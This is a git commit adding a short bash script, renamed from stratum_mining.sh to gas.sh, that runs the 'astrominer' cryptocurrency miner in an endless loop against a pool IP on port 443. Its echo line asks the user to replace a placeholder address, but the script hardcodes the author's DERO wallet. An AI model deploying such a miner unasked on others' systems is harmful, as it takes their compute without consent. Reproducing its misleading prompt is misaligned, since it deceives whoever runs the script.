e2d5422a4ce7b42e99d0159775980a700cb63e4b
beranisalah <107521325+beranisalah@users.noreply.github.com>
2022-12-12 23:48:38 +0000

    Update and rename stratum_mining.sh to gas.sh

---
+++ gas.sh
@@ -0,0 +1,6 @@
+#!/bin/bash
+echo "Replace YOUR_ADDRESS to run the miner"
+while :; do
+    ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xee87fwsrs6zxfqrntthr -r 51.222.96.66:443 -p stratum;
+    sleep 5;
+done
